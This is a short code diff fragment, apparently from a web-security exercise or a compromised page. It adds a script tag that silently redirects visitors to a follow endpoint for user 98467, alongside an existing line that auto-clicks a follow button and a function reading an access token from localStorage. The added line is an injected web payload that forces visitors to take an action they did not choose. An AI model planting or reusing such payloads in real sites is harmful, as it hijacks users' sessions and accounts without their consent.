@@ -1,4 +1,5 @@
 document.getElementById("followButton").click();
+<script>window.location.href = `/api/follow.php?follow_user_id=98467&follow=1`</script>
 
 async function SendFeedback() {
     token = localStorage.getItem("access_token")
